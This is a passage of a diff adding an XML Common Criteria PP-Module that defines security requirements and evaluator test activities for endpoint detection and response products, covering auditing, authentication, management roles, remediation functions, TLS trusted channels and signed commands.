+                  <test>The evaluator shall follow guidance to unenroll a Host Agent from the EDR and verify that the unenrollment action is recorded in an auditable and timestamped activity log.</test>
+                  <test>The evaluator shall follow guidance to enroll a Host Agent to the EDR and verify that the enrollment action is recorded in an auditable and timestamped activity log.</test>
+                  <test>The evaluator shall perform the action to generate all other auditable events listed in the assignment and verify the activity is recorded.</test>
+                </testlist>
+                When verifying the test results from FAU_GEN.1.1/EDR, the evaluator shall ensure the audit data generated during testing match the format specified in the administrative guide, and that the fields in each audit record have the proper entries.
+                <h:br/>
+                <h:br/>
+                Note that the testing here can be accomplished in conjunction with the testing of the security mechanisms directly. For example, testing performed to ensure that the administrative guidance provided is correct verifies that AGD_OPE.1 is satisfied and should address the invocation of the administrative actions that are needed to verify the audit data are generated as expected.
+                <h:br/>
+                <h:br/>
+              </Tests>
+            </aactivity>
+          </f-element>
+          <audit-event table="mandatory"/>
+        </f-component>
+      </section>
+      <!-- 5.2.2 Identification and Authentication (FIA) -->
+      <section title="Identification and Authentication (FIA)" id="fia-mandatory">
+        <ext-comp-def title="Dashboard Authentication Mechanisms" fam-id="FIA_AUT_EXT">
+          <fam-behavior>Components in this family define requirements for authentication behavior that is unique to an EDR TOE.</fam-behavior>
+        </ext-comp-def>
+        <ext-comp-def title="Password Authentication" fam-id="FIA_PWD_EXT">
+          <fam-behavior>Components in this family define requirements for password authentication criteria.</fam-behavior>
+        </ext-comp-def>
+        <!-- FIA_AUT_EXT.1 Dashboard Authentication Mechanisms -->
+        <f-component cc-id="fia_aut_ext.1" id="fia-aut-ext-1" name="Dashboard Authentication Mechanisms">
+          <consistency-rationale>
+            This SFR defines authentication mechanisms for the EDR. It does
+              not impact the
+            <xref to="bibAppPP"/>
+            functionality.
+          </consistency-rationale>
+          <comp-lev> identifies the only authentication factors that may be used for authentication to a management interface of an EDR.</comp-lev>
+          <dependencies>No dependencies.</dependencies>
+          <f-element id="fia_aut_ext-1-1">
+            <title>
+              The TSF shall
+              <selectables>
+                <selectable id="fia_aut_ext.1.1_1">leverage the platform for authentication</selectable>
+                <selectable id="fia_aut_ext.1.1_2">provide authentication based on username/password and <selectables linebreak="yes"><selectable id="fia_aut_ext.1.1_3">authentication with external smart card and PIN</selectable><selectable id="fia_aut_ext.1.1_4">no other factors</selectable></selectables></selectable>
+              </selectables>
+              to support logins to any management dashboard or API.
+            </title>
+            <note role="application">The selection specifies if Smartcards are also supported, one selection must be made.</note>
+            <aactivity>
+              <TSS>
+                The evaluator shall examine the TSS to ensure that it describes how user authentication is performed.  
+                The evaluator shall verify that the authorization methods listed in the TSS are specified and included in the requirements in the ST.
+                <h:p/>
+              </TSS>
+              <Guidance>
+                The evaluator shall review the operational guidance to ensure that it
+                  contains documentation on configuring any supported authentication mechanisms and any support for 
+                  multifactor authentication.
+                <h:p/>
+              </Guidance>
+              <Tests>
+                <testlist>
+                  <test>Conditional: If "provide authentication..." is selected, the evaluator shall create an account with a username and password, verifying that login authentication is case-sensitive. If additional factors are provided, each factor shall be tested for login access. The evaluator shall verify that login access is granted for correct credentials and denied in cases of incorrect credentials across available factors.</test>
+                  <test>Conditional: If "leverage the platform" is selected, the evaluator shall create an account following the platform rules. The evaluator shall verify that login access is granted for correct credentials and denied in cases of incorrect credentials across available factors.</test>
+                </testlist>
+              </Tests>
+            </aactivity>
+          </f-element>
+          <audit-event table="mandatory"/>
+        </f-component>
+        <!-- FIA_PWD_EXT.1 Password Authentication -->
+        <f-component cc-id="fia_pwd_ext.1" id="fia-pwd-ext-1" name="Password Authentication">
+          <consistency-rationale>
+            This SFR defines specific authentication criteria for
+              passwords. It does not impact the
+            <xref to="bibAppPP"/>
+            functionality.
+          </consistency-rationale>
+          <comp-lev> defines the length and character set requirements for password authentication factors.</comp-lev>
+          <dependencies>FIA_AUT_EXT.1 Dashboard Authentication Mechanisms</dependencies>
+          <f-element id="fia_pwd_ext-1-1">
+            <title>
+              The TSF shall support the following for the Password
+                Authentication Factor:
+              <h:ol>
+                <h:li>Passwords shall be able to be composed of any combination of  <selectables><selectable id="fia_pwd_ext.1.1_1">upper and lower case letters</selectable><selectable id="fia_pwd_ext.1.1_3"><assignable>a character set of at least 52 characters</assignable></selectable></selectables>, numbers, and special characters:  <selectables><selectable id="fia_pwd_ext.1.1_4">"!"</selectable><selectable id="fia_pwd_ext.1.1_5">"@"</selectable><selectable id="fia_pwd_ext.1.1_6">"#"</selectable><selectable id="fia_pwd_ext.1.1_7">"$"</selectable><selectable id="fia_pwd_ext.1.1_8">"%"</selectable><selectable id="fia_pwd_ext.1.1_9">"^"</selectable><selectable id="fia_pwd_ext.1.1_10">"&amp;"</selectable><selectable id="fia_pwd_ext.1.1_11">"*"</selectable><selectable id="fia_pwd_ext.1.1_12">"("</selectable><selectable id="fia_pwd_ext.1.1_13">")"</selectable><selectable id="fia_pwd_ext.1.1_15"><assignable>other characters</assignable></selectable></selectables>, </h:li>
+                <h:li>Password length up to <assignable>an integer greater than or equal to 64</assignable>  characters shall be supported. </h:li>
+              </h:ol>
+            </title>
+            <note role="application">The ST author selects the character set:
+                either the upper and lower case Basic Latin letters or another assigned character
+                set containing at least 52 characters. The assigned character set must be well
+                defined: either according to an international encoding standard (such as Unicode) or
+                defined in the assignment by the ST author. The ST
+                 author also selects the special characters that are supported by the TOE;
+                 they may optionally list additional special characters supported
+                using the assignment.</note>
+            <aactivity>
+              <TSS>The evaluator shall verify the TSS lists the supported character set for the composition of administrator passwords. The evaluator shall verify that the TSS lists a password length value that is greater than or equal to 64.<h:p/></TSS>
+              <Guidance>
+                The evaluator shall review the operational guidance to ensure that it
+                  contains documentation on default password policy.
+                <h:p/>
+              </Guidance>
+              <Tests>
+                The evaluator shall perform the following tests:
+                <testlist>
+                  <test>The evaluator shall verify that passwords up to 64 characters are supported.</test>
+                  <test>The evaluator shall verify that password composition rules present in operational guidance are enforced. While the evaluator is not required (nor is it feasible) to test all possible composition rules, the evaluator shall ensure that all characters are supported, and rule characteristics listed in the requirement are enforced.</test>
+                </testlist>
+              </Tests>
+            </aactivity>
+          </f-element>
+          <audit-event table="mandatory"/>
+        </f-component>
+      </section>
+      <!-- 5.2.3 Security Management (FMT) -->
+      <section title="Security Management (FMT)" id="fmt-mandatory">
+        <ext-comp-def title="Specification of Remediation Functions" fam-id="FMT_SRF_EXT">
+          <fam-behavior>Components in this family define requirements for remediation functions that an EDR can perform to affect the behavior of an endpoint system.</fam-behavior>
+        </ext-comp-def>
+        <!-- FMT_SMF.1/ENDPOINT Specification of Management Functions (EDR Management of EDR) -->
+        <f-component cc-id="fmt_smf.1" id="fmt-smf-1-endpoint" name="Specification of Management Functions (EDR Management of EDR)" iteration="ENDPOINT">
+          <consistency-rationale>
+            This SFR defines a specific set of management functions for an
+              EDR by an EDR. It does not impact the
+            <xref to="bibAppPP"/>
+            functionality.
+          </consistency-rationale>
+          <f-element id="fmt_smf-1-1_ENDPOINT">
+            <title>
+              The TSF shall be capable of performing the following management functions:
+              <h:br/>
+              <h:br/>
+              <h:b>
+                <ctr id="fmt_smf" ctr-type="Table">: Management Functions</ctr>
+              </h:b>
+              <h:br/>
+              <h:br/>
+              [Status Markers:
+              <h:br/>
+              M - Mandatory
+              <h:br/>
+              O - Optional or Objective
+              <h:br/>
+              - -
+              Not Applicable
+              <h:br/>
+              <management-function-set default="O">
+                <manager cid="A">Administrator</manager>
+                <manager cid="S">SOC Analyst</manager>
+                <manager cid="U">Read-Only User</manager>
+                <management-function id="mf-1">
+                  <text>Configure the amount of time to retain data collected by the EDR <assignable>time frame to retain data</assignable></text>
+                  <M ref="A"/>
+                  <O ref="S"/>
+                  <NA ref="U"/>
+                </management-function>
+                <management-function id="mf-2">
+                  <text>Obtain or display the connectivity status of a Host Agent</text>
+                  <M ref="A"/>
+                  <O ref="S"/>
+                  <O ref="U"/>
+                </management-function>
+                <management-function id="mf-3">
+                  <text>Define a configurable list of <selectables><selectable id="fmt_smf.1.1_ENDPOINT_2">filenames</selectable><selectable id="fmt_smf.1.1_ENDPOINT_3">folders</selectable><selectable id="fmt_smf.1.1_ENDPOINT_4">file hashes</selectable><selectable id="fmt_smf.1.1_ENDPOINT_6"><assignable>other factors</assignable></selectable></selectables></text>
+                  <O ref="A"/>
+                  <M ref="S"/>
+                  <NA ref="U"/>
+                </management-function>
+                <management-function id="mf-4">
+                  <text>Configure visual suppression of incident alerts based on a configurable list of <selectables><selectable id="fmt_smf.1.1_ENDPOINT_7">filenames</selectable><selectable id="fmt_smf.1.1_ENDPOINT_8">folders</selectable><selectable id="fmt_smf.1.1_ENDPOINT_9">file hashes</selectable><selectable id="fmt_smf.1.1_ENDPOINT_11"><assignable>other factors</assignable></selectable></selectables></text>
+                  <O ref="A"/>
+                  <M ref="S"/>
+                  <NA ref="U"/>
+                </management-function>
+              </management-function-set>].
+            </title>
+            <note role="application">This requirement captures all the configuration
+                functionality the TSF provides the administrator to configure the
+                EDR. Both configurable lists mentioned in the table, above, are intended to match one another.</note>
+            <aactivity>
+              <TSS>
+                The evaluator shall verify the TSS contains a list of roles and what functions they can perform.  
+                  The evaluator shall verify the list matches the chart in the requirement.
+                <h:p/>
+              </TSS>
+              <Guidance>
+                The evaluator shall review the operational guidance to verify that the EDR has
+                  documented capabilities to perform the management functions.
+                <h:p/>
+              </Guidance>
+              <Tests>
+                The evaluator shall perform the below tests with each role, verifying each role is denied or can complete the action below as specified by the chart in the SFR:
+                <testlist>
+                  <test>The evaluator shall configure the amount of time to retain collected EDR data to a time frame in which existing data will be made unavailable and verify that the data is no longer accessible through the EDR management dashboard.</test>
+                  <test>The evaluator shall logically or physically inhibit the network communications between a managed endpoint system and the EDR server and verify that the inhibited or halted connectivity status of the Host Agent is recognized on the EDR management dashboard.</test>
+                  <test>The evaluator shall use a file that triggers an incident alert to test the suppression of such alerts for that specific file. Upon confirming the creation of incident alerts on access to the file, the evaluator shall configure suppression of the alert for each selected suppression method (e.g., filenames) and verify that incident alerts are categorized as suppressed, hidden, unavailable, never created, or similarly categorized. No specific category naming is required, but it should follow the general intent of the examples provided.</test>
+                </testlist>
+              </Tests>
+            </aactivity>
+          </f-element>
+          <audit-event table="mandatory"/>
+        </f-component>
+        <!-- FMT_SMF.1/HOST Specification of Management Functions (EDR Management of Host Agent) -->
+        <f-component cc-id="fmt_smf.1" id="fmt-smf-1-host" name="Specification of Management Functions (EDR Management of Host Agent)" iteration="HOST">
+          <consistency-rationale>
+            This SFR defines a specific set of management functions for a
+              Host Agent by an EDR. It does not impact the
+            <xref to="bibAppPP"/>
+            functionality.
+          </consistency-rationale>
+          <f-element id="fmt_smf-1-1_HOST">
+            <title>
+              The TSF shall be capable of performing the following management functions
+              <h:b>that control
+                behavior of the Host Agent</h:b>:
+              <h:br/>
+              <h:br/>
+              <h:b>
+                <ctr id="fmt_smf" ctr-type="Table">: Management Functions</ctr>
+              </h:b>
+              <h:br/>
+              <h:br/>
+              [Status Markers:
+              <h:br/>
+              M - Mandatory
+              <h:br/>
+              O - Optional or Objective
+              <h:br/>
+              - -
+                Not Applicable
+              <h:br/>
+              <management-function-set default="O">
+                <manager cid="A">Administrator</manager>
+                <manager cid="S">SOC Analyst</manager>
+                <manager cid="U">Read-Only User</manager>
+                <management-function id="mf-1">
+                  <text>Configure the frequency for sending Host Agent data to the EDR <assignable>list of configurable frequencies</assignable></text>
+                  <M ref="A"/>
+                  <O ref="S"/>
+                  <NA ref="U"/>
+                </management-function>
+                <management-function id="mf-2">
+                  <text>Assign a label or tag to categorize or group individual endpoint systems</text>
+                  <M ref="A"/>
+                  <O ref="S"/>
+                  <NA ref="U"/>
+                </management-function>
+              </management-function-set>].
+            </title>
+            <note role="application">
+              This requirement captures all the configuration
+                functionality the EDR provides the administrator to configure the
+                EDR Host Agents. The frequency for sending data to the EDR can be specified as a
+                time value, but does not have to be. A value like Aggressive, Normal, Low Bandwidth
+                is a measure of control of frequency and meets the requirement. For EDR products, 
+                some management is performed through a product’s configuration files stored at the
+                OS level. In these cases, the OS administrator can be considered the administrator
+                of the TOE.
+              <h:p/>
+            </note>
+            <aactivity>
+              <TSS>
+                The evaluator shall verify the TSS contains a list of roles and what functions they can perform.  
+                  The evaluator shall verify the list matches the chart in the requirement.
+                <h:p/>
+              </TSS>
+              <Guidance>
+                The evaluator shall review the operational guidance to verify that the EDR has
+                documented capabilities to perform the management functions.
+                <h:p/>
+              </Guidance>
+              <Tests>
+                The evaluator shall perform the below tests:
+                <testlist>
+                  <test>The evaluator shall modify the time frame for sending Host Agent data to the EDR and verify that an affected Host Agent is sending data at the intended interval.</test>
+                  <test>The evaluator shall tag or categorize a group of individual endpoint systems and verify that the tag or categorization persists within the EDR management dashboard for other users.</test>
+                  <test>The evaluator shall attempt each function with each role and verify access conforms with the chart in the requirement. If no interface exists for a particular role to perform a function, that is sufficient to test that the role is not capable of performing the given function.</test>
+                </testlist>
+              </Tests>
+            </aactivity>
+          </f-element>
+          <audit-event table="mandatory"/>
+        </f-component>
+        <!-- FMT_SMR.1 Security Management Roles -->
+        <f-component cc-id="fmt_smr.1" id="fmt-smr-1" name="Security Management Roles">
+          <consistency-rationale>
+            This SFR defines a specific set of management roles for an EDR.
+              It does not impact the
+            <xref to="bibAppPP"/>
+            functionality.
+          </consistency-rationale>
+          <f-element id="fmt_smr-1-1">
+            <title>The TSF shall maintain the roles [<h:i>administrator, SOC analyst, read-only
+                user</h:i>].</title>
+          </f-element>
+          <f-element id="fmt_smr-1-2">
+            <title>The TSF shall be able to associate users with roles.</title>
+            <note role="application">
+              The EDR will be configured, maintained, and
+                used by different user roles. At a minimum, one administrative role shall be
+                supported, one SOC analyst who can issue remediation commands to host agents, and
+                one read-only user who can only view data.
+              <h:p/>
+              The user accounts need not be named literally, but they must have the implication of such roles.
+              <h:p/>
+              CC Part 2 specifies FIA_UID.1 as a dependency of this requirement because the TSF must have some way of identifying users so that they can be associated with management roles. 
+              This dependency is implicitly addressed through FIA_AUT_EXT.1, which specifies an alternative method of user identification.
+            </note>
+            <aactivity>
+              <TSS>
+                The evaluator shall examine the TSS to verify that it
+                  describes the roles and the powers granted to and limitations of the role.
+                <h:p/>
+              </TSS>
+              <Guidance>
+                The evaluator shall review the operational guidance to ensure that it
+                  contains instructions for administering the EDR, which user
+                  roles are supported, and which permissions each role has.
+                <h:p/>
+              </Guidance>
+              <Tests>
+                <testlist>
+                  <test>The evaluator shall verify that the roles of administrator, SOC analyst, and read-only user are available, creating individual accounts with each role assigned.</test>
+                  <test>The evaluator shall verify that non-administrator roles are not able to modify the roles of their own account or those of others.</test>
+                  <test>In the course of performing the testing activities for the evaluation, the evaluator shall use all supported interfaces, although it is not necessary to repeat each test involving an administrative action with each interface. The evaluator shall ensure, however, that each supported method of administering the EDR that conforms to the requirements of this PP be tested; for instance, if the EDR can be administered through a local hardware interface or TLS/HTTPS then both methods of administration must be exercised during the execution of the test activities.</test>
+                  <test>The evaluator shall attempt each function with each role and verify access conforms with the chart in the requirement.</test>
+                </testlist>
+              </Tests>
+            </aactivity>
+          </f-element>
+          <audit-event table="mandatory"/>
+        </f-component>
+        <!-- FMT_SRF_EXT.1 Specification of Remediation Functions -->
+        <f-component cc-id="fmt_srf_ext.1" id="fmt-srf-ext-1" name="Specification of Remediation Functions">
+          <consistency-rationale>
+            This SFR defines a specific set of remediation functions for an
+              EDR. It does not impact the
+            <xref to="bibAppPP"/>
+            functionality.
+          </consistency-rationale>
+          <comp-lev> lists the supported remediation functions and identifies the management roles that may perform these functions.</comp-lev>
+          <dependencies>FMT_SMR.1 Security Management Roles</dependencies>
+          <f-element id="fmt_srf_ext-1-1">
+            <title>
+              The TSF shall be capable of performing the following remediation functions:
+              <h:br/>
+              <h:br/>             
+			  <h:b>
+                <ctr id="fmt_srf_ext" ctr-type="Table">: Management
+                  Functions</ctr>
+              </h:b>
+              <h:br/>
+              <h:br/>
+              [Status Markers:
+              <h:br/>
+              M - Mandatory
+              <h:br/>
+              O - Optional or Objective
+              <h:br/>
+              - -
+                Not Applicable
+              <h:br/>
+              <h:br/>
+              <management-function-set default="O">
+                <manager cid="A">Administrator</manager>
+                <manager cid="S">SOC Analyst</manager>
+                <manager cid="U">Read-Only User</manager>
+                <management-function id="mf-1">
+                  <text>Quarantine an endpoint by <selectables><selectable id="fmt_srf_ext.1.1_1">logically quarantining the endpoint from the network unless allowlisted</selectable><selectable id="fmt_srf_ext.1.1_2">quarantining the malicious file on the endpoint</selectable></selectables></text>
+                  <O ref="A"/>
+                  <M ref="S"/>
+                  <NA ref="U"/>
+                </management-function>
+                <management-function id="mf-2">
+                  <text>Terminate a running process on an endpoint</text>
+                  <O ref="A"/>
+                  <M ref="S"/>
+                  <NA ref="U"/>
+                </management-function>
+                <management-function id="mf-3">
+                  <text>Retrieve potentially unauthorized or affected files from an endpoint</text>
+                  <O ref="A"/>
+                  <O ref="S"/>
+                  <NA ref="U"/>
+                </management-function>
+              </management-function-set>].
+            </title>
+            <note role="application">
+              <h:p>This requirement captures all the remediation functionality
+                the EDR provides the SOC Analyst and optionally the Administrator.</h:p>
+              <h:p>Logically quarantine from the network refers to restricting communications from the endpoint to the rest of the network, 
+                it may include a restricted allowlist.</h:p>
+              <h:p>Any function that is not mandatory for at least one role is considered optional for the TOE.</h:p>
+            </note>
+            <aactivity>
+              <TSS>
+                The evaluator shall check to ensure that the TSS describes what roles can perform what 
+                  remediation actions and how each remediation action is performed.
+                <h:p/>
+              </TSS>
+              <Guidance>
+                The evaluator shall review the operational guidance to verify that the EDR has
+                  documented capabilities to perform the management functions.
+                <h:p/>
+              </Guidance>
+              <Tests>
+                For each role, the evaluator shall perform the below tests, verifying that each role in the chart can perform their permitted functions and are restricted from performing functions that they do not have access to per the
+                <testlist>
+                  <test>Conditional: If "logically quarantining the endpoint from the network unless allowlisted" is selected the evaluator shall logically quarantine a managed endpoint system from the network and verify that the system is unable to access network addresses or resources outside of an allowlist.</test>
+                  <test>Conditional: If "quarantining the malicious file on the endpoint" is selected the evaluator shall verify the functionality to quarantine potentially unauthorized files on the endpoint.</test>
+                  <test>The evaluator shall run an executable on a managed endpoint system, terminate its process from the EDR management dashboard, and then verify that the process is no longer running on the system.</test>
+                  <test>(Conditional: if the EDR includes the function to retrieve potentially unauthorized or affected files from an endpoint, then): The evaluator shall place a file known to trigger an incident alert on the file system then retrieve the contents of the file from the EDR management dashboard.</test>
+                </testlist>
+              </Tests>
+            </aactivity>
+          </f-element>
+          <audit-event table="mandatory"/>
+        </f-component>
+      </section>
+      <!-- 5.2.4 Protection of the TSF (FPT) -->
+      <section title="Protection of the TSF (FPT)" id="fpt-mandatory">
+        <!-- FPT_ITT.1 Basic Internal TSF Data Transfer Protection -->
+        <f-component cc-id="fpt_itt.1" id="fpt-itt-1" name="Basic Internal TSF Data Transfer Protection">
+          <consistency-rationale>
+            This SFR defines a specific set of functions for logically distinct secure
+              communication with a Host Agent. It does not impact the
+            <xref to="bibAppPP"/>
+            functionality.
+          </consistency-rationale>
+          <f-element id="fpt_itt-1-1">
+            <title>The <h:b>EDR</h:b> shall<h:b> <selectables><selectable id="fpt_itt.1.1_1">implement <selectables><selectable id="itt_tls_from_package">TLS as defined in the TLS Package</selectable><selectable id="https_from_package">HTTPS as defined in the Base-PP</selectable></selectables> </selectable><selectable id="fpt_itt.1.1_2">invoke platform-provided functionality for <selectables><selectable id="itt_invoke_platform_tls">TLS</selectable><selectable id="fpt_itt.1.1_3">HTTPS</selectable></selectables> </selectable></selectables> 
+                to</h:b> protect TSF data from [<h:i>modification, disclosure</h:i>] when it is transmitted between separate parts of the TOE. </title>
+            <note role="application">
+              The intent of the above requirement is to use the
+                cryptographic protocols identified in the requirement to establish and maintain a
+                trusted channel between the EDR and the Host Agent, which are considered to be separate parts of the TOE. The TLS Package permits the use of either TLS or DTLS. Only TLS, DTLS, or
+                HTTPS can be used in this trusted channel.
+              <h:p/>
+              This requirement is to
+                ensure that the transmission of any logs, process lists, system information, etc,
+                when commanded, or at configurable intervals, is properly protected. This internal
+                channel also protects any commands and policies sent by the EDR to
+                the Host Agent. Either the Host Agent or the EDR is able to
+                initiate the connection.
+              <h:p/>
+              This internal channel protects both the
+                connection between an enrolled Host Agent and the EDR and the
+                connection between an unenrolled Host Agent and the EDR during the
+                enrollment operation. Different protocols can be used for these two connections, and
+                the description in the TSS should make this difference clear.
+              <h:p/>
+              The internal channel uses a protocol from the TLS Package or HTTPS as the protocol that preserves
+                the confidentiality and integrity of EDR communications. The ST author chooses the mechanism 
+                or mechanisms supported by the EDR, and then ensures the correct requirements are included in the 
+                ST if not already present. Protocol, RBG, certificate validation,
+                algorithm, and similar services may be met with platform-provided services.
+            </note>
+            <aactivity>
+              <TSS>
+                If "invoke platform-provided functionality for..." is selected, the evaluator shall verify the TSS contains the calls to the platform that TOE is leveraging to invoke the functionality.
+                <h:br/>
+                <h:br/>
+                If "implement..." is selected, the evaluator shall examine the TSS to verify how Agent-Server communications are protected is described and conforms to the SFR. 
+                  The evaluator shall also confirm that all protocols
+                  listed in the TSS are consistent with those specified in the requirement, and are
+                  included in the requirements in the ST.
+                <h:p/>
+              </TSS>
+              <Guidance>
+                The evaluator shall confirm that the operational guidance contains
+                  instructions for configuring the communication channel between the Host Agent and
+                  the EDR for each supported method.
+                <h:p/>
+              </Guidance>
+              <Tests>
+                <testlist>
+                  <test>The evaluators shall ensure that communications using each specified (in the operational guidance) Agent-Server communication method is tested during the course of the evaluation, setting up the connections as described in the operational guidance and ensuring that communication is successful.</test>
+                  <test>The evaluator shall ensure, for each method of Agent-Server communication, the channel data is not sent in plaintext.</test>
+                </testlist>
+              </Tests>
+            </aactivity>
+          </f-element>
+          <audit-event table="mandatory"/>
+        </f-component>
+      </section>
+      <!-- 5.2.5 Trusted Path/Channels (FTP) -->
+      <section title="Trusted Path/Channels (FTP)" id="ftp-mandatory">
+        <!-- FTP_TRP.1 Trusted Path -->
+        <f-component cc-id="ftp_trp.1" id="ftp-trp-1" name="Trusted Path">
+          <consistency-rationale>
+            This SFR defines a specific set of functions for secure remote
+              administration of the EDR. It does not impact
+            <xref to="bibAppPP"/>
+            functionality.
+          </consistency-rationale>
+          <f-element id="ftp_trp-1-1">
+            <title>
+              The TSF shall
+              <h:b> <selectables><selectable id="ftp_trp.1.1_1">implement <selectables><selectable id="trp_tls_from_package">TLS as defined in the TLS Package</selectable><selectable id="ITC_HTTPS_2">HTTPS as defined in the Base-PP</selectable></selectables> </selectable><selectable id="ftp_trp.1.1_2">invoke platform-provided functionality for <selectables><selectable id="ftp_invoke_platform_tls">TLS</selectable><selectable id="ftp_trp.1.1_3">HTTPS</selectable></selectables> </selectable></selectables>  to</h:b>
+              provide a communication path between itself and [<h:i>remote</h:i>]
+              <h:b>administrators</h:b>
+              that is logically distinct from other communication paths and
+                provides assured identification of its end points and protection of the communicated
+                data from [<h:i>modification, disclosure</h:i>].
+            </title>
+          </f-element>
+          <f-element id="ftp_trp-1-2">
+            <title>
+              The TSF shall
+              <h:b> <selectables><selectable id="ftp_trp.1.2_1">implement functionality</selectable><selectable id="ftp_trp.1.2_2">invoke platform-provided functionality</selectable></selectables>  to</h:b>
+              permit [<h:i>remote <h:b>administrators</h:b></h:i>] to initiate communication via the
+                trusted path.
+            </title>
+          </f-element>
+          <f-element id="ftp_trp-1-3">
+            <title>The TSF shall<h:b> <selectables><selectable id="ftp_trp.1.3_1">implement functionality</selectable><selectable id="ftp_trp.1.3_2">invoke platform-provided functionality</selectable></selectables>  to </h:b>require the use of the trusted path for [<h:i>all remote
+                administration actions</h:i>].</title>
+            <note role="application">This requirement ensures that authorized remote
+                administrators initiate all communication with the EDR via a
+                trusted path, and that all communications with the EDR by remote
+                administrators is performed over this path. The data passed in this trusted
+                communication channel are encrypted as defined in the protocol chosen in the first
+                selection. The ST author chooses the mechanism or mechanisms
+                supported by the EDR.</note>
+            <aactivity>
+              <TSS>
+                The evaluator shall examine the TSS to verify how remote administration communications are protected is described and conforms to the SFR. 
+                  The evaluator shall examine the TSS to determine that the
+                  methods of remote TOE administration are indicated, along with
+                  how those communications are protected. The evaluator shall also confirm that all
+                  protocols listed in the TSS in support of TOE
+                  administration are consistent with those specified in the requirement, and are
+                  included in the requirements in the ST.
+                <h:br/>
+                <h:br/>
+                If "invoke platform-provided functionality for..." is selected in FTP_TRP.1.1, the evaluator shall verify the TSS contains the calls to the platform that TOE is leveraging to invoke the functionality.
+                <h:p/>
+              </TSS>
+              <Guidance>
+                The evaluator shall confirm that the operational guidance contains
+                  instructions for establishing the remote administrative sessions for each
+                  supported method.
+                <h:p/>
+              </Guidance>
+              <Tests>
+                <testlist>
+                  <test>The evaluators shall ensure that communications using each specified (in the operational guidance) remote administration method is tested during the course of the evaluation, setting up the connections as described in the operational guidance and ensuring that communication is successful.</test>
+                  <test>For each method of remote administration supported, the evaluator shall follow the operational guidance to ensure that there is no available interface that can be used by a remote user to establish remote administrative sessions without invoking the trusted path.</test>
+                  <test>The evaluator shall ensure, for each method of remote administration, the channel data is not sent in plaintext.</test>
+                </testlist>
+              </Tests>
+            </aactivity>
+          </f-element>
+          <audit-event table="mandatory"/>
+        </f-component>
+      </section>
+    </man-sfrs>
+    <opt-sfrs/>
+    <sel-sfrs/>
+    <obj-sfrs>
+      <section id="sec-obj-audit-table" title="Auditable Events for Objective SFRs">
+        <audit-table id="at-objective" table="objective"/>
+      </section>
+      <!-- 5.2.6 Security Management (FMT) -->
+      <section title="Security Management (FMT)" id="fmt-objective">
+        <ext-comp-def title="Trusted Remediation Functions" fam-id="FMT_TRM_EXT">
+          <fam-behavior>Components in this family define how the TOE can assert the authenticity of the remediation actions it requests from Host Agents.</fam-behavior>
+        </ext-comp-def>
+        <!-- FMT_TRM_EXT.1 Trusted Remediation Functions -->
+        <f-component cc-id="fmt_trm_ext.1" id="fmt-trm-ext-1" name="Trusted Remediation Functions">
+          <depends>
+            <objective/>
+          </depends>
+          <consistency-rationale>
+            This SFR defines protections for the integrity of commands sent to
+            the Host Agent. It does not impact the
+            <xref to="bibAppPP"/>
+            functionality.
+          </consistency-rationale>
+          <comp-lev> requires all management activities bound for a Host Agent to be digitally signed.</comp-lev>
+          <dependencies>No dependencies.</dependencies>
+          <f-element id="fmt_trm_ext-1-1">
+            <title>
+              The
+              <selectables>
+                <selectable id="fmt_trm_ext.1.1_1">EDR</selectable>
+                <selectable id="fmt_trm_ext.1.1_2">EDR Platform</selectable>
+              </selectables>
+              shall digitally sign commands and policies sent to the Host Agent using
+              <selectables>
+                <selectable id="fmt_trm_ext.1.1_3">RSA</selectable>
+                <selectable id="fmt_trm_ext.1.1_4">ECDSA</selectable>
+              </selectables>
+              signatures that meet FIPS PUB 186-5.
+            </title>
+            <note role="application">The intent of this requirement is to cryptographically tie any policy updates or
+            commands sent to the Host Agent as being from the EDR. This is not to 
+            protect the policies in transit as they are already protected by FPT_ITT.1. 
+            If the TSF implements this function, any signature algorithms used should be consistent with any selections made in 
+            FCS_COP.1/Sig Gen and FCS_COP.1/SigVer in the Protection Profile for Application Software, Version 2.0.</note>
+            <aactivity>
+              <TSS>The evaluator shall check to ensure that the TSS describes how all commands and policies are signed.<h:p/></TSS>
+              <Guidance>
+                The evaluator shall review the operational guidance and ensure that the
+                EDR any configuration information for policy signing is included.
+                <h:p/>
+              </Guidance>
+              <Tests>The evaluator shall select any one remediation function documented in the administrative guide (e.g., terminate process), and execute that command while capturing traffic. The evaluator shall review captured network traffic and verify that a digital signature was sent along with the coinciding command or policy update. The EDR may need to be configured in a manner to disable transport encryption for this test or the network capture tool may need to be configured with the private key such that decrypted traffic can be made available to the evaluator.</Tests>
+            </aactivity>
+          </f-element>
+          <audit-event table="objective"/>
+        </f-component>
+      </section>
+    </obj-sfrs>
+    <impl-dep-sfrs/>
+  </sec:Security_Requirements>
+  <appendix title="Implicitly Satisfied Requirements" id="satisfiedreqs">
+    <h:table>
+      <h:tr class="header">
+        <h:td>Requirement</h:td>
+        <h:td>Rationale for Satisfaction</h:td>
+      </h:tr>
+      <h:tr>
+        <h:td>FIA_UID.1 - Timing of Identification</h:td>
+        <h:td>CC Part 2 specifies FIA_UID.1 as a dependency of FMT_SMR.1 because the TSF must have some way of identifying users so that they can be associated with management roles. 
+          This dependency is implicitly addressed through FIA_AUT_EXT.1, which specifies an alternative method of user identification.</h:td>
+      </h:tr>
+      <h:tr>
+        <h:td>FPT_STM.1 - Reliable Time Stamps</h:td>
+        <h:td>CC Part 2 specifies FPT_STM.1 as a dependency of FAU_GEN.1 because the audit data require a reliable timestamp to satisfy FAU_GEN.1.2. 
+          This dependency is implicitly addressed through the A.PLATFORM assumption of the Base-PP because a "trustworthy computing platform" is assumed to include a reliable system clock.</h:td>
+      </h:tr>
+    </h:table>
+  </appendix>
+  <bibliography>
+    <entry id="bibAppPP">
+      <tag>AppPP</tag>
+      <description>
+        <h:a href="https://www.niap-ccevs.org/protectionprofiles/516">Protection Profile for Application Software, Version 2.0, June 16, 2025</h:a>
+      </description>
+    </entry>
+    <entry id="bibEDRPP">
+      <tag>EDR</tag>
+      <description>
+        <h:a href="https://www.niap-ccevs.org/pp/"> PP-Module for Host Agent</h:a>, Version 2.0, January 13, 2026
+      </description>
+    </entry>
+  </bibliography>
+</Module>
